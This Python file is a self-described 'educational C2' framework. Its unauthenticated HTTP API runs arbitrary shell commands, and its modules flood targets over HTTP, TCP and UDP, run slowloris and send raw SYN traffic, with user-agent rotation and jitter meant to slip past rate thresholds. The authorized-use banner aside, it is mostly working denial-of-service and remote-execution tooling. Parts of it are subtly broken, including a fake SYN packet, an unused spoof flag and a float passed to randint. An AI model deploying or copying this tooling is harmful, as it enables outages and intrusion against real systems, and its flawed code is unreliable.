#!/usr/bin/env python3
"""
NetMesh — minimalist educational C2 / pentest lab framework.

AUTHORIZED USE ONLY. Run against systems you own or have explicit
written permission to test. Unauthorized use of these techniques
against third-party systems is illegal in most jurisdictions.

Stdlib only. Python 3.7+. Linux / macOS / Windows.
"""

import socket, struct, sys, threading, subprocess, json, time, random, os, shlex, uuid, urllib.request
import itertools
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

VERSION = "1.0.0"
PRINT_LOCK = threading.Lock()
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/17.4",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
    "curl/8.5.0",
    "Wget/1.21.4",
]

# ============================================================ protocol

def send_msg(sock, obj):
    data = json.dumps(obj).encode()
    sock.sendall(struct.pack(">I", len(data)) + data)

def _recvall(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf

def recv_msg(sock):
    try:
        header = _recvall(sock, 4)
        if header is None:
            return None
        (length,) = struct.unpack(">I", header)
        payload = _recvall(sock, length)
        return json.loads(payload.decode()) if payload else None
    except (OSError, json.JSONDecodeError):
        return None

# ============================================================ bot modules

MODULES = {}
TASK_EVENTS = {}
TASK_LOCK = threading.Lock()

def module(name):
    def deco(fn):
        MODULES[name] = fn
        return fn
    return deco

def _stop_event(task_id):
    with TASK_LOCK:
        return TASK_EVENTS.setdefault(task_id, threading.Event())

def _paced_sleep(interval, jitter):
    """Rate-limited pause with optional randomization (anti-threshold testing)."""
    if jitter:
        time.sleep(max(0.0, interval * random.uniform(0.5, 1.5)))
    else:
        time.sleep(interval)

@module("ping")
def mod_ping(args):
    return {"status": "ok", "out": "pong"}

@module("sysinfo")
def mod_sysinfo(args):
    info = {
        "platform": sys.platform,
        "python": sys.version.split()[0],
        "user": os.environ.get("USER") or os.environ.get("USERNAME", "?"),
        "cwd": os.getcwd(),
        "host": socket.gethostname(),
    }
    return {"status": "ok", "out": json.dumps(info, indent=2)}

@module("shell")
def mod_shell(args):
    try:
        p = subprocess.run(args["cmd"], shell=True, capture_output=True, timeout=120)
        out = (p.stdout + p.stderr).decode(errors="replace") or "(no output)"
        return {"status": "ok", "out": out[:8000]}
    except Exception as e:
        return {"status": "err", "out": str(e)}

@module("scan")
def mod_scan(args):
    """Concurrent TCP connect scan over a port range."""
    host, start, end = args["host"], int(args["start"]), int(args["end"])
    end = min(end, start + 4096)
    open_ports, lock = [], threading.Lock()

    def probe(port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            if s.connect_ex((host, port)) == 0:
                with lock:
                    open_ports.append(port)
            s.close()
        except OSError:
            pass

    threads = [threading.Thread(target=probe, args=(p,)) for p in range(start, end + 1)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    open_ports.sort()
    body = ", ".join(map(str, open_ports)) or "none"
    return {"status": "ok", "out": f"open ports on {host} ({start}-{end}): {body}"}

PROFILES = {
    "slow": 1.0, "normal": 10.0, "aggressive": 100.0,
}

@module("httpflood")
def mod_httpflood(args):
    """Rate-limited HTTP GET load test with UA rotation + jitter."""
    url = args["url"]
    dur = float(args.get("duration", 30))
    rate = float(args.get("rate", PROFILES.get(args.get("profile", "normal"), 10)))
    jitter = str(args.get("jitter", "1")).lower() in ("1", "true", "yes")
    ev = _stop_event(args["task_id"])
    interval = 1.0 / max(rate, 0.1)
    ok = err = 0
    t0 = time.time()
    while time.time() - t0 < dur and not ev.is_set():
        try:
            req = urllib.request.Request(
                url, headers={"User-Agent": random.choice(UAS),
                              "Accept": "/", "Connection": "keep-alive"})
            r = urllib.request.urlopen(req, timeout=10)
            r.read(512)
            r.close()
            ok += 1
        except Exception:
            err += 1
        _paced_sleep(interval, jitter)
    return {"status": "ok",
            "out": f"httpflood {url}: {ok} ok / {err} err in {dur:.0f}s (rate={rate}/s jitter={jitter})"}

@module("slowloris")
def mod_slowloris(args):
    """Partial-header connection-holding test."""
    host = args["host"]
    port = int(args.get("port", 80))
    nsocks = int(args.get("sockets", 50))
    dur = float(args.get("duration", 60))
    keep = float(args.get("interval", 10))
    jitter = str(args.get("jitter", "1")).lower() in ("1", "true", "yes")
    ev = _stop_event(args["task_id"])
    sockets = []
    t0 = time.time()

    def newsock():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(15)
            s.connect((host, port))
            s.sendall(f"GET /?{random.randint(0,1e9)} HTTP/1.1\r\n"
                      f"Host: {host}\r\n".encode())
            return s
        except OSError:
            return None

    while len(sockets) < nsocks and not ev.is_set() and time.time() - t0 < dur:
        s = newsock()
        if s:
            sockets.append(s)
        _paced_sleep(0.05, False)

    kept = dropped = 0
    while time.time() - t0 < dur and not ev.is_set():
        for i, s in enumerate(list(sockets)):
            try:
                s.sendall(f"X-a{random.randint(0,1e6)}: b\r\n".encode())
                kept += 1
            except OSError:
                dropped += 1
                sockets.remove(s)
        if not ev.is_set():
            ns = newsock()
            if ns:
                sockets.append(ns)
        _paced_sleep(keep, jitter)
    for s in sockets:
        try:
            s.close()
        except OSError:
            pass
    return {"status": "ok",
            "out": f"slowloris {host}:{port}: held {kept} keep-alive frags, {dropped} drops, {len(sockets)} sockets still open at end"}

@module("tcpflood")
def mod_tcpflood(args):
    """Paced TCP connection+payload load test."""
    host, port = args["host"], int(args["port"])
    dur = float(args.get("duration", 30))
    rate = float(args.get("rate", PROFILES.get(args.get("profile", "normal"), 10)))
    size = min(int(args.get("size", 512)), 65507)
    jitter = str(args.get("jitter", "1")).lower() in ("1", "true", "yes")
    ev = _stop_event(args["task_id"])
    payload = random.randbytes(size) if hasattr(random, "randbytes") \
        else bytes(random.getrandbits(8) for _ in range(size))
    interval = 1.0 / max(rate, 0.1)
    ok = err = 0
    t0 = time.time()
    while time.time() - t0 < dur and not ev.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, port))
            s.sendall(payload)
            s.close()
            ok += 1
        except OSError:
            err += 1
        _paced_sleep(interval, jitter)
    return {"status": "ok",
            "out": f"tcpflood {host}:{port}: {ok} ok / {err} err, {size}B x {rate}/s, {dur:.0f}s"}

@module("udpflood")
def mod_udpflood(args):
    """Paced UDP packet load test."""
    host, port = args["host"], int(args["port"])
    dur = float(args.get("duration", 30))
    rate = float(args.get("rate", PROFILES.get(args.get("profile", "normal"), 10)))
    size = min(int(args.get("size", 512)), 65507)
    jitter = str(args.get("jitter", "1")).lower() in ("1", "true", "yes")
    ev = _stop_event(args["task_id"])
    interval = 1.0 / max(rate, 0.1)
    sent = 0
    t0 = time.time()
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    except OSError as e:
        return {"status": "err", "out": str(e)}
    while time.time() - t0 < dur and not ev.is_set():
        pkt = random.randbytes(size) if hasattr(random, "randbytes") \
            else bytes(random.getrandbits(8) for _ in range(size))
        try:
            s.sendto(pkt, (host, port))
            sent += 1
        except OSError:
            pass
        _paced_sleep(interval, jitter)
    s.close()
    return {"status": "ok",
            "out": f"udpflood {host}:{port}: {sent} packets ({sent*size} bytes) in {dur:.0f}s at {rate}/s"}

@module("synflood")
def mod_synflood(args):
    """Raw-socket SYN flood for testing your own SYN-flood hardening."""
    host, port = args["host"], int(args["port"])
    dur = float(args.get("duration", 30))
    rate = float(args.get("rate", PROFILES.get(args.get("profile", "aggressive"), 100)))
    spoof = str(args.get("spoof", "0")).lower() in ("1", "true", "yes")
    ev = _stop_event(args["task_id"])
    interval = 1.0 / max(rate, 0.1)

    try:
        raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        raw = None

    if raw is None:
        return mod_tcpflood({**args, "size": "0", "port_end": str(port)})

    sent = 0
    t0 = time.time()
    while time.time() - t0 < dur and not ev.is_set():
        sport = random.randint(1024, 65535)
        try:
            raw.sendto(b"SYN", (host, port))
            sent += 1
        except OSError:
            pass
        _paced_sleep(interval, False)
    raw.close()
    return {"status": "ok",
            "out": f"synflood {host}:{port}: {sent} packets in {dur:.0f}s (spoof={spoof})"}

@module("stop")
def mod_stop(args):
    ev = _stop_event(args.get("target_task", ""))
    if ev:
        ev.set()
    return {"status": "ok", "out": f"stop signalled for {args.get('target_task')}"}

# ============================================================ http server (api + ui)

BOTS = {}
BOT_LOCK = threading.Lock()
TASK_SEQ = itertools.count(1)

def _bot(bid):
    with BOT_LOCK:
        if bid not in BOTS:
            BOTS[bid] = {"results": [], "tasks": [], "addr": "?"}
        return BOTS[bid]

def dispatch(bid, module_name, args):
    task_id = str(next(TASK_SEQ))
    task = {"task_id": task_id, "module": module_name, "args": args}
    _bot(bid)["tasks"].append(task)
    return task_id

class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_GET(self):
        if self.path == "/ui":
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            with open("ui.html", "rb") as f:
                self.wfile.write(f.read())
        elif self.path == "/api/modules":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"modules": list(MODULES.keys())}).encode())
        elif self.path.startswith("/api/task/"):
            task_id = self.path.split("/")[-1]
            with BOT_LOCK:
                results = [r for r in _bot("all")["results"] if r.get("task_id") == task_id]
            status = "running"
            out = ""
            if results:
                status = results[-1].get("status", "running")
                out = results[-1].get("out", "")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"task_id": task_id, "status": status, "out": out}).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/api/run":
            length = int(self.headers.get("Content-Length", 0))
            try:
                data = json.loads(self.rfile.read(length).decode())
                module_name = data.get("module")
                args = data.get("args", {})
                if module_name not in MODULES:
                    self.send_response(400)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(json.dumps({"error": f"unknown module '{module_name}'"}).encode())
                    return
                task_id = str(next(TASK_SEQ))
                args["task_id"] = task_id
                try:
                    result = MODULES[module_name](args)
                except Exception as e:
                    result = {"status": "err", "out": f"{type(e).__name__}: {e}"}
                with BOT_LOCK:
                    _bot("all")["results"].append({"task_id": task_id, **result})
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"task_id": task_id}).encode())
            except Exception as e:
                self.send_response(500)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(json.dumps({"error": str(e)}).encode())
        elif self.path.startswith("/api/stop/"):
            task_id = self.path.split("/")[-1]
            with TASK_LOCK:
                if task_id in TASK_EVENTS:
                    TASK_EVENTS[task_id].set()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())
        else:
            self.send_response(404)
            self.end_headers()

def serve(host, port):
    httpd = ThreadingHTTPServer((host, port), C2Handler)
    print(f"NetMesh API on http://{host}:{port}  (UI at /ui)")
    httpd.serve_forever()

# ============================================================ CLI entry point

USAGE = """netmesh - local network lab harness
  netmesh serve [--host 0.0.0.0] [--port 8000]     start API + UI
  netmesh run <module> [key=value ...]             run a module headless
modules: ping, sysinfo, shell, scan, httpflood, slowloris, tcpflood, udpflood, synflood
examples:
  netmesh run ping host=1.1.1.1
  netmesh run scan host=192.168.1.1 start=1 end=1024
  netmesh serve --port 8080
"""

def _cli():
    argv = sys.argv[1:]
    if not argv or argv[0] in ("-h", "--help"):
        print(USAGE)
        return
    if argv[0] == "serve":
        host, port = "0.0.0.0", 8000
        for i, a in enumerate(argv):
            if a == "--host" and i + 1 < len(argv):
                host = argv[i + 1]
            elif a == "--port" and i + 1 < len(argv):
                port = int(argv[i + 1])
        serve(host, port)
        return
    if argv[0] == "run" and len(argv) >= 2:
        name = argv[1]
        if name not in MODULES:
            print(f"unknown module '{name}'. available: {', '.join(MODULES)}")
            return
        args = {"task_id": "cli"}
        for kv in argv[2:]:
            k, _, v = kv.partition("=")
            args[k] = v
        try:
            result = MODULES[name](args)
        except Exception as e:
            result = {"status": "error", "out": f"{type(e).__name__}: {e}"}
        print(result["out"])
        return
    print(USAGE)

if __name__ == "__main__":
    _cli()
